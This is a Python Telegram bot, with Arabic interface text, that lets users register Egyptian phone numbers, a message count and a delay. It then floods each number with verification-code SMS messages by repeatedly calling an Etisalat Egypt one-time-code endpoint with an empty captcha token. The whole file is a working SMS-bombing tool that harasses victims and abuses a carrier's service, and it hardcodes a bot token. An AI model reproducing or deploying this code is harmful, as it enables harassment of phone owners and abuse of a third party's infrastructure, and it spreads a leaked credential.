import asyncio
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters

TOKEN = "8391097394:AAEnBb8yCZlcKhLPg2CW4ed5rOm3wb4nMbg"
URL = "https://mab.etisalat.com.eg:11003/Saytar/rest/quickAccess/sendVerCodeQuickAccessV4"
HEADERS = {
    'Host': "mab.etisalat.com.eg:11003",
    'User-Agent': "okhttp/5.0.0-alpha.11",
    'Connection': "Keep-Alive",
    'Accept': "text/xml",
    'Content-Type': "text/xml; charset=UTF-8",
}

# بيانات كل مستخدم
numbers_data = {}  # {user_id: {number: {"count": 5, "delay": 1.0}}}
sending_tasks = {}  # {user_id: asyncio.Task}
stop_flags = {}  # {user_id: bool}

# ======== /start =========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 أهلاً! هذه الأوامر:\n"
        "/add - إضافة رقم وعدد رسائل ووقت الانتظار\n"
        "/show - عرض أرقامك وعدد الرسائل والفاصل\n"
        "/send - إرسال الرسائل لأرقامك"
    )

# ======== /add =========
ASK_NUMBER, ASK_COUNT, ASK_DELAY = range(3)

async def add_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📨 ابعت الرقم:")
    return ASK_NUMBER

async def get_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    if not (number.isdigit() and len(number) == 11 and number.startswith("01")):
        await update.message.reply_text("❌ الرقم غير صالح! ابعت رقم صحيح يبدأ بـ01:")
        return ASK_NUMBER
    context.user_data["number"] = number
    await update.message.reply_text("📨 ابعت عدد الرسائل:")
    return ASK_COUNT

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text)
        if count <= 0:
            await update.message.reply_text("❌ العدد لازم يكون أكبر من صفر:")
            return ASK_COUNT
        context.user_data["count"] = count
        await update.message.reply_text("⏱️ ابعت الفاصل بالثواني بين كل رسالة:")
        return ASK_DELAY
    except ValueError:
        await update.message.reply_text("❌ لازم تبعت رقم صحيح:")
        return ASK_COUNT

async def get_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        delay = float(update.message.text)
        if delay <= 0:
            await update.message.reply_text("❌ الفاصل لازم يكون أكبر من صفر:")
            return ASK_DELAY

        user_id = update.message.from_user.id
        number = context.user_data["number"]
        count = context.user_data["count"]

        if user_id not in numbers_data:
            numbers_data[user_id] = {}

        # تخزين الرقم الجديد مع القديم
        numbers_data[user_id][number] = {"count": count, "delay": delay}

        # عرض كل الأرقام اللي عند المستخدم
        msg = "✅ تم تسجيل الرقم الجديد.\n\n📌 أرقامك المسجلة:\n"
        for num, data in numbers_data[user_id].items():
            msg += f"{num} : {data['count']} رسالة | كل {data['delay']} ثانية\n"

        keyboard = [[InlineKeyboardButton(f"🚀 إرسال {number}", callback_data=f"send_{number}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(msg, reply_markup=reply_markup)
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ لازم تبعت رقم صحيح:")
        return ASK_DELAY

# ======== /show =========
async def show_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in numbers_data or not numbers_data[user_id]:
        await update.message.reply_text("❌ لا يوجد أرقام مسجلة.")
        return
    msg = "📌 أرقامك:\n"
    for num, data in numbers_data[user_id].items():
        msg += f"{num} : {data['count']} رسالة | كل {data['delay']} ثانية\n"
    await update.message.reply_text(msg)

# ======== إيقاف =========
async def stop_automation(user_id: int):
    stop_flags[user_id] = True

# ======== إرسال الرسائل =========
async def send_task_function(bot, chat_id, user_id, numbers_list):
    stop_flags[user_id] = False
    for number in numbers_list:
        if stop_flags.get(user_id):
            await bot.send_message(chat_id=chat_id, text="🛑 تم الإيقاف!")
            break
        info = numbers_data[user_id][number]
        count = info["count"]
        delay = info["delay"]
        for i in range(count):
            if stop_flags.get(user_id):
                break
            payload = f"""<?xml version='1.0' encoding='UTF-8' standalone='no' ?>
<sendVerCodeQuickAccessRequest>
    <dial>{number}</dial>
    <hCaptchaToken></hCaptchaToken>
    <udid></udid>
</sendVerCodeQuickAccessRequest>"""
            try:
                response = requests.post(URL, data=payload, headers=HEADERS)
                if "true" in response.text.lower():
                    await bot.send_message(chat_id=chat_id, text=f"✅ SMS {i+1} للرقم {number}")
                else:
                    await bot.send_message(chat_id=chat_id, text=f"⚠️ SMS {i+1} فشل للرقم {number}")
            except Exception as e:
                await bot.send_message(chat_id=chat_id, text=f"❌ خطأ: {e}")
            await asyncio.sleep(delay)
    await bot.send_message(chat_id=chat_id, text="🎉 تم الانتهاء!")

# ======== /send =========
async def send_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in numbers_data or not numbers_data[user_id]:
        await update.message.reply_text("❌ لا يوجد أرقام.")
        return
    selected_numbers = set()
    keyboard = [[InlineKeyboardButton(num, callback_data=num)] for num in numbers_data[user_id].keys()]
    keyboard.append([InlineKeyboardButton("🚀 إرسال", callback_data="send")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("📌 اختر الأرقام:", reply_markup=reply_markup)
    context.user_data["selected_numbers"] = selected_numbers

async def send_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    selected_numbers = context.user_data.get("selected_numbers", set())
    data = query.data

    if data.startswith("send_"):
        number = data.replace("send_", "")
        selected_numbers = {number}
        context.user_data["selected_numbers"] = selected_numbers
        task = asyncio.create_task(send_task_function(context.bot, query.message.chat.id, user_id, list(selected_numbers)))
        sending_tasks[user_id] = task
        keyboard = [[InlineKeyboardButton("🛑 إيقاف", callback_data="call_stop_automation")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"🚀 جاري إرسال الرسائل للرقم: {number}", reply_markup=reply_markup)
        return

    if data == "send":
        if not selected_numbers:
            await query.edit_message_text("❌ اختر رقم واحد على الأقل.")
            return
        task = asyncio.create_task(send_task_function(context.bot, query.message.chat.id, user_id, list(selected_numbers)))
        sending_tasks[user_id] = task
        keyboard = [[InlineKeyboardButton("🛑 إيقاف", callback_data="call_stop_automation")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"🚀 جاري الإرسال للأرقام: {', '.join(selected_numbers)}", reply_markup=reply_markup)

    elif data == "call_stop_automation":
        await stop_automation(user_id)
        await query.edit_message_reply_markup(reply_markup=None)
        await context.bot.send_message(chat_id=query.message.chat.id, text="🛑 تم الإيقاف!")

    else:
        if data in selected_numbers:
            selected_numbers.remove(data)
        else:
            selected_numbers.add(data)
        context.user_data["selected_numbers"] = selected_numbers
        keyboard = [[InlineKeyboardButton(f"✅ {num}" if num in selected_numbers else num, callback_data=num)
                     for num in numbers_data[user_id].keys()]]
        keyboard.append([InlineKeyboardButton("🚀 إرسال", callback_data="send")])
        if sending_tasks.get(user_id) and not sending_tasks[user_id].done():
            keyboard.append([InlineKeyboardButton("🛑 إيقاف", callback_data="call_stop_automation")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        try:
            await query.edit_message_reply_markup(reply_markup=reply_markup)
        except:
            pass

# ======== main =========
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    add_conv = ConversationHandler(
        entry_points=[CommandHandler("add", add_number)],
        states={
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
            ASK_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
            ASK_DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay)],
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("show", show_numbers))
    app.add_handler(add_conv)
    app.add_handler(CommandHandler("send", send_start))
    app.add_handler(CallbackQueryHandler(send_button))

    print("🤖 البوت شغال...")
    app.run_polling()

if __name__ == "__main__":
    main()